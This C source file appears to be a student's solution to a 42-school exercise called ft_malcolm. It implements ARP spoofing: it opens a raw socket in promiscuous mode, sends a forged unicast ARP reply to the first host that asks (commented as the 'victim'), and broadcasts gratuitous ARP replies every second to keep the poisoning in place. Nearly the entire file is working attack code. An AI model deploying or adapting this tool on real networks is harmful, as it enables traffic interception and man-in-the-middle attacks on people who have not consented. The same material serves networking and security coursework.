/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   malcolm.c - IMPROVED                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nicolas <nicolas@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/04 18:38:53 by nponchon          #+#    #+#             */
/*   Updated: 2025/11/20 14:15:16 by nicolas          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../incs/ft_malcolm.h"
#include <unistd.h>
#include <time.h>
#include <sys/ioctl.h>

extern int g_sigint;

void	send_gratuitous_arp(t_malcolm *m)
{
	struct ifreq ifr = {0};
	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);

	if (ioctl(m->socket, SIOCGIFINDEX, &ifr) < 0) {
		perror("ioctl SIOCGIFINDEX failed");
		return;
	}
	int ifindex = ifr.ifr_ifindex;

	unsigned char src_mac[6];
	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&src_mac[0], &src_mac[1], &src_mac[2], &src_mac[3], &src_mac[4], &src_mac[5]);

	// Gratuitous ARP: destination is broadcast
	unsigned char broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

	struct ether_header eth;
	memcpy(eth.ether_shost, src_mac, 6);
	memcpy(eth.ether_dhost, broadcast_mac, 6);  // Broadcast!
	eth.ether_type = htons(ETH_P_ARP);

	struct ether_arp arp;
	arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp.ea_hdr.ar_pro = htons(ETH_P_IP);
	arp.ea_hdr.ar_hln = 6;
	arp.ea_hdr.ar_pln = 4;
	arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
	memcpy(arp.arp_sha, src_mac, 6);
	inet_pton(AF_INET, m->source_ip, arp.arp_spa);
	// For gratuitous ARP: target is same as source (self-announcement)
	memcpy(arp.arp_tha, src_mac, 6);
	inet_pton(AF_INET, m->source_ip, arp.arp_tpa);

	unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	memcpy(packet, &eth, sizeof(eth));
	memcpy(packet + sizeof(eth), &arp, sizeof(arp));

	struct sockaddr_ll sll = {0};
	sll.sll_ifindex = ifindex;
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, broadcast_mac, 6);

	printf("[POISON] Sending gratuitous ARP: '%s is at %s'\n", m->source_ip, m->source_mac);

	ssize_t bytes_sent = sendto(m->socket, packet, sizeof(packet), 0, (struct sockaddr*)&sll, sizeof(sll));
	if (bytes_sent < 0) {
		perror("sendto failed");
	} else {
		printf("[POISON] Successfully sent (%zd bytes)\n", bytes_sent);
	}
}

void	send_unicast_arp_reply(t_malcolm *m, unsigned char *target_mac)
{
	struct ifreq ifr = {0};
	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);

	if (ioctl(m->socket, SIOCGIFINDEX, &ifr) < 0) {
		perror("ioctl SIOCGIFINDEX failed");
		return;
	}
	int ifindex = ifr.ifr_ifindex;

	unsigned char src_mac[6];
	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&src_mac[0], &src_mac[1], &src_mac[2], &src_mac[3], &src_mac[4], &src_mac[5]);

	struct ether_header eth;
	memcpy(eth.ether_shost, src_mac, 6);
	memcpy(eth.ether_dhost, target_mac, 6);  // Unicast to specific victim
	eth.ether_type = htons(ETH_P_ARP);

	struct ether_arp arp;
	arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp.ea_hdr.ar_pro = htons(ETH_P_IP);
	arp.ea_hdr.ar_hln = 6;
	arp.ea_hdr.ar_pln = 4;
	arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
	memcpy(arp.arp_sha, src_mac, 6);
	inet_pton(AF_INET, m->source_ip, arp.arp_spa);
	memcpy(arp.arp_tha, target_mac, 6);
	inet_pton(AF_INET, m->target_ip, arp.arp_tpa);

	unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	memcpy(packet, &eth, sizeof(eth));
	memcpy(packet + sizeof(eth), &arp, sizeof(arp));

	struct sockaddr_ll sll = {0};
	sll.sll_ifindex = ifindex;
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, target_mac, 6);

	printf("[REPLY] Sending unicast ARP reply to %02x:%02x:%02x:%02x:%02x:%02x\n",
		target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);

	ssize_t bytes_sent = sendto(m->socket, packet, sizeof(packet), 0, (struct sockaddr*)&sll, sizeof(sll));
	if (bytes_sent < 0) {
		perror("sendto failed");
	} else {
		printf("[REPLY] Successfully sent (%zd bytes)\n", bytes_sent);
	}
}

int	listen_arp(t_malcolm *m)
{
	m->socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (m->socket < 0) {
		fprintf(stderr, "Error: unable to create raw socket\n");
		return (free_malcolm(m), 1);
	}

	if (setsockopt(m->socket, SOL_SOCKET, SO_BINDTODEVICE, "eth0", strlen("eth0")) < 0) {
		perror("setsockopt SO_BINDTODEVICE failed");
		return (free_malcolm(m), 1);
	}

	struct packet_mreq mreq = {0};
	mreq.mr_ifindex = if_nametoindex("eth0");
	mreq.mr_type = PACKET_MR_PROMISC;
	setsockopt(m->socket, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mreq, sizeof(mreq));

	unsigned char buf[65536];
	struct sockaddr_ll addr;
	socklen_t addrlen = sizeof(addr);
	int first_request = 1;
	time_t last_poison = 0;

	printf("Starting to listen for packets between A and B...\n");

	while (g_sigint == 0) {
		time_t now = time(NULL);

		// Send gratuitous ARP every second to maintain poisoning
		if (now - last_poison >= 1) {
			send_gratuitous_arp(m);
			last_poison = now;
		}

		// Set receive timeout so we don't block forever
		struct timeval tv;
		tv.tv_sec = 1;
		tv.tv_usec = 0;
		setsockopt(m->socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

		ssize_t len = recvfrom(m->socket, buf, sizeof(buf), 0,
							(struct sockaddr*)&addr, &addrlen);
		if (len < 0) {
			// Timeout or error, just continue to next iteration (gratuitous ARP will be sent)
			continue;
		}

		struct ether_header *eth = (struct ether_header*)buf;
		if (ntohs(eth->ether_type) != ETH_P_ARP)
			continue;

		// On first ARP request, send immediate unicast reply + gratuitous
		if (first_request) {
			print_arp(buf);
			unsigned char *sender_mac = eth->ether_shost;
			send_unicast_arp_reply(m, sender_mac);
			send_gratuitous_arp(m);
			first_request = 0;
			last_poison = time(NULL);
		}
	}

	close(m->socket);
	return (0);
}
